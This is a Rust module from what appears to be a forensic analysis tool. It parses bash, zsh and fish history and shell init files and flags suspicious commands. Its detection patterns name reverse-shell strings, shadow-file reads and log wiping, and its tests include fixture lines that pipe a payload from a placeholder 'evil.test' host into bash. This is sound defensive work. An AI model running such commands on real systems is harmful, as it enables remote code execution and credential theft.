//! Linux shell history + init-file persistence (LNX-1).
//!
//! MITRE: T1059.004 (Unix shell), T1546.004 (shell config persistence).
//!
//! Zero `unwrap`, zero `unsafe`, zero `println!` per CLAUDE.md.

use chrono::{DateTime, Utc};
use std::fs;
use std::path::Path;
use strata_plugin_sdk::Artifact;

#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ShellHistoryEntry {
    pub shell: String,
    pub username: String,
    pub command: String,
    pub timestamp: Option<DateTime<Utc>>,
    pub suspicious_pattern: Option<String>,
    pub line_number: usize,
}

pub fn classify(path: &Path) -> Option<(&'static str, String)> {
    let lower = path.to_string_lossy().replace('\\', "/").to_ascii_lowercase();
    let name = lower.rsplit('/').next().unwrap_or("");
    let username = username_from_path(&lower);
    match name {
        ".bash_history" => Some(("bash", username)),
        ".zsh_history" => Some(("zsh", username)),
        "fish_history" => Some(("fish", username)),
        _ => None,
    }
}

pub fn is_init_path(path: &Path) -> bool {
    let lower = path.to_string_lossy().replace('\\', "/").to_ascii_lowercase();
    let name = lower.rsplit('/').next().unwrap_or("");
    matches!(
        name,
        ".bashrc"
            | ".bash_profile"
            | ".profile"
            | ".zshrc"
            | ".zprofile"
            | "bash.bashrc"
            | "environment"
            | "config.fish"
    )
}

fn username_from_path(lower: &str) -> String {
    if let Some(pos) = lower.find("/home/") {
        let rest = &lower[pos + 6..];
        let end = rest.find('/').unwrap_or(rest.len());
        return rest[..end].to_string();
    }
    if lower.starts_with("/root/") {
        return "root".to_string();
    }
    "unknown".to_string()
}

fn classify_command(cmd: &str) -> Option<&'static str> {
    let lc = cmd.to_ascii_lowercase();
    if lc.contains("bash -i >& /dev/tcp/") || lc.contains("/dev/tcp/") || lc.contains("nc -e") {
        return Some("reverse-shell");
    }
    let uses_fetch =
        lc.contains("curl ") || lc.contains("wget ") || lc.contains("scp ") || lc.contains("rsync ");
    let has_remote = lc.contains("http://") || lc.contains("https://") || lc.contains('@');
    if uses_fetch && has_remote {
        return Some("exfil-download");
    }
    if lc.contains("shred ") || lc.contains("wipe ") || lc.contains("rm -rf /var/log") || lc == "history -c" {
        return Some("anti-forensic");
    }
    if lc.contains("crontab -e") || lc.contains("systemctl enable") || lc.contains(".bashrc") {
        return Some("persistence");
    }
    if lc.contains("cat /etc/shadow") || lc.contains("cat /etc/passwd") || lc.contains("unshadow") {
        return Some("credential-access");
    }
    if lc.starts_with("sudo ") || lc.contains("chmod 4755") || lc.contains("setuid") {
        return Some("priv-esc");
    }
    None
}

pub fn parse_bash(body: &str) -> Vec<ShellHistoryEntry> {
    let mut out = Vec::new();
    let mut pending_ts: Option<DateTime<Utc>> = None;
    for (idx, raw) in body.lines().enumerate() {
        let line = raw.trim_end_matches('\r');
        if line.is_empty() {
            continue;
        }
        if let Some(ts_str) = line.strip_prefix('#') {
            if let Ok(secs) = ts_str.trim().parse::<i64>() {
                if secs > 0 && secs < 32503680000 {
                    pending_ts = DateTime::<Utc>::from_timestamp(secs, 0);
                    continue;
                }
            }
        }
        out.push(ShellHistoryEntry {
            shell: "bash".into(),
            username: String::new(),
            command: line.to_string(),
            timestamp: pending_ts.take(),
            suspicious_pattern: classify_command(line).map(|s| s.to_string()),
            line_number: idx + 1,
        });
    }
    out
}

pub fn parse_zsh(body: &str) -> Vec<ShellHistoryEntry> {
    let mut out = Vec::new();
    for (idx, raw) in body.lines().enumerate() {
        let line = raw.trim_end_matches('\r');
        if line.is_empty() {
            continue;
        }
        if let Some(rest) = line.strip_prefix(": ") {
            if let Some((header, cmd)) = rest.split_once(';') {
                let ts = header
                    .split(':')
                    .next()
                    .and_then(|s| s.trim().parse::<i64>().ok())
                    .and_then(|s| DateTime::<Utc>::from_timestamp(s, 0));
                out.push(ShellHistoryEntry {
                    shell: "zsh".into(),
                    username: String::new(),
                    command: cmd.to_string(),
                    timestamp: ts,
                    suspicious_pattern: classify_command(cmd).map(|s| s.to_string()),
                    line_number: idx + 1,
                });
                continue;
            }
        }
        out.push(ShellHistoryEntry {
            shell: "zsh".into(),
            username: String::new(),
            command: line.to_string(),
            timestamp: None,
            suspicious_pattern: classify_command(line).map(|s| s.to_string()),
            line_number: idx + 1,
        });
    }
    out
}

pub fn parse_fish(body: &str) -> Vec<ShellHistoryEntry> {
    let mut out = Vec::new();
    let mut current_cmd: Option<String> = None;
    let mut current_when: Option<DateTime<Utc>> = None;
    let mut line_number = 0usize;
    for (idx, raw) in body.lines().enumerate() {
        line_number = idx + 1;
        let line = raw.trim_end_matches('\r');
        if let Some(rest) = line.trim_start().strip_prefix("- cmd:") {
            if let Some(prev_cmd) = current_cmd.take() {
                out.push(ShellHistoryEntry {
                    shell: "fish".into(),
                    username: String::new(),
                    command: prev_cmd.clone(),
                    timestamp: current_when,
                    suspicious_pattern: classify_command(&prev_cmd).map(|s| s.to_string()),
                    line_number,
                });
                current_when = None;
            }
            current_cmd = Some(rest.trim().to_string());
        } else if let Some(when) = line.trim_start().strip_prefix("when:") {
            if let Ok(secs) = when.trim().parse::<i64>() {
                current_when = DateTime::<Utc>::from_timestamp(secs, 0);
            }
        }
    }
    if let Some(cmd) = current_cmd {
        out.push(ShellHistoryEntry {
            shell: "fish".into(),
            username: String::new(),
            command: cmd.clone(),
            timestamp: current_when,
            suspicious_pattern: classify_command(&cmd).map(|s| s.to_string()),
            line_number,
        });
    }
    out
}

pub fn scan(path: &Path) -> Vec<Artifact> {
    let mut out = Vec::new();
    if let Some((shell, username)) = classify(path) {
        let Ok(body) = fs::read_to_string(path) else {
            return Vec::new();
        };
        let entries = match shell {
            "bash" => parse_bash(&body),
            "zsh" => parse_zsh(&body),
            "fish" => parse_fish(&body),
            _ => Vec::new(),
        };
        let mut total = 0usize;
        for entry in &entries {
            total += 1;
            if let Some(reason) = &entry.suspicious_pattern {
                let mut a = Artifact::new("Shell History", &path.to_string_lossy());
                a.timestamp = entry.timestamp.map(|d| d.timestamp() as u64);
                a.add_field(
                    "title",
                    &format!(
                        "{} ({}) [{}]: {}",
                        shell,
                        username,
                        reason,
                        entry.command.chars().take(120).collect::<String>()
                    ),
                );
                a.add_field("file_type", "Shell History");
                a.add_field("shell", shell);
                a.add_field("username", &username);
                a.add_field("command", &entry.command);
                a.add_field("suspicious_pattern", reason);
                a.add_field("line_number", &entry.line_number.to_string());
                a.add_field("mitre", "T1059.004");
                a.add_field("forensic_value", "High");
                a.add_field("suspicious", "true");
                out.push(a);
            }
        }
        // Summary artifact.
        let mut summary = Artifact::new("Shell History", &path.to_string_lossy());
        summary.add_field(
            "title",
            &format!("{} history summary ({} commands)", shell, total),
        );
        summary.add_field(
            "detail",
            &format!(
                "User: {} | Shell: {} | Commands: {} | Suspicious: {}",
                username,
                shell,
                total,
                out.len()
            ),
        );
        summary.add_field("file_type", "Shell History Summary");
        summary.add_field("shell", shell);
        summary.add_field("username", &username);
        summary.add_field("command_count", &total.to_string());
        summary.add_field("mitre", "T1059.004");
        summary.add_field("forensic_value", "Medium");
        out.push(summary);
        return out;
    }
    if is_init_path(path) {
        if let Ok(body) = fs::read_to_string(path) {
            for (idx, line) in body.lines().enumerate() {
                if let Some(reason) = classify_init_line(line) {
                    let mut a = Artifact::new("Shell Init Persistence", &path.to_string_lossy());
                    a.add_field(
                        "title",
                        &format!(
                            "{} line {}: {}",
                            path.file_name()
                                .and_then(|n| n.to_str())
                                .unwrap_or("init"),
                            idx + 1,
                            line.chars().take(80).collect::<String>()
                        ),
                    );
                    a.add_field("file_type", "Shell Init Persistence");
                    a.add_field("reason", reason);
                    a.add_field("line_number", &(idx + 1).to_string());
                    a.add_field("content", line);
                    a.add_field("mitre", "T1546.004");
                    a.add_field("forensic_value", "High");
                    a.add_field("suspicious", "true");
                    out.push(a);
                }
            }
        }
    }
    out
}

fn classify_init_line(line: &str) -> Option<&'static str> {
    let t = line.trim();
    if t.is_empty() || t.starts_with('#') {
        return None;
    }
    let lc = t.to_ascii_lowercase();
    if lc.contains("http://") || lc.contains("https://") {
        return Some("external-url");
    }
    if lc.contains("base64 -d") || lc.contains("base64_decode") {
        return Some("base64-decode");
    }
    if lc.contains("curl ") || lc.contains("wget ") {
        return Some("fetch-command");
    }
    if lc.contains("/tmp/") {
        return Some("tmp-path");
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn classify_matches_shell_history_paths() {
        assert_eq!(
            classify(Path::new("/home/alice/.bash_history")),
            Some(("bash", "alice".into()))
        );
        assert_eq!(
            classify(Path::new("/home/bob/.zsh_history")),
            Some(("zsh", "bob".into()))
        );
        assert_eq!(
            classify(Path::new("/home/carol/.local/share/fish/fish_history")),
            Some(("fish", "carol".into()))
        );
        assert!(classify(Path::new("/tmp/other")).is_none());
    }

    #[test]
    fn parse_bash_honours_timestamp_prefix() {
        let body = "#1717243200\nls /etc\n#1717243300\ncat /etc/passwd\n";
        let entries = parse_bash(body);
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[1].suspicious_pattern.as_deref(), Some("credential-access"));
        assert_eq!(
            entries[0].timestamp.map(|d| d.timestamp()),
            Some(1_717_243_200)
        );
    }

    #[test]
    fn parse_zsh_extended_format() {
        let body = ": 1717243200:0;echo hi\n: 1717243300:1;curl https://evil.test/payload\n";
        let entries = parse_zsh(body);
        assert_eq!(entries.len(), 2);
        assert_eq!(entries[1].suspicious_pattern.as_deref(), Some("exfil-download"));
    }

    #[test]
    fn parse_fish_yaml_block() {
        let body = "- cmd: ls /etc\n  when: 1717243200\n- cmd: curl https://evil.test/p\n  when: 1717243300\n";
        let entries = parse_fish(body);
        assert_eq!(entries.len(), 2);
        assert!(entries
            .iter()
            .any(|e| e.suspicious_pattern.as_deref() == Some("exfil-download")));
    }

    #[test]
    fn classify_init_line_flags_external_url() {
        assert_eq!(
            classify_init_line("curl https://evil.test/payload | bash"),
            Some("external-url")
        );
        assert_eq!(classify_init_line("# safe comment"), None);
    }

    #[test]
    fn scan_emits_shell_history_artifacts() {
        let dir = tempfile::tempdir().expect("tempdir");
        let home = dir.path().join("home").join("alice");
        std::fs::create_dir_all(&home).expect("mkdirs");
        let path = home.join(".bash_history");
        std::fs::write(&path, "ls\nhistory -c\n").expect("w");
        let arts = scan(&path);
        assert!(arts
            .iter()
            .any(|a| a.data.get("suspicious_pattern").map(|s| s.as_str())
                == Some("anti-forensic")));
    }
}
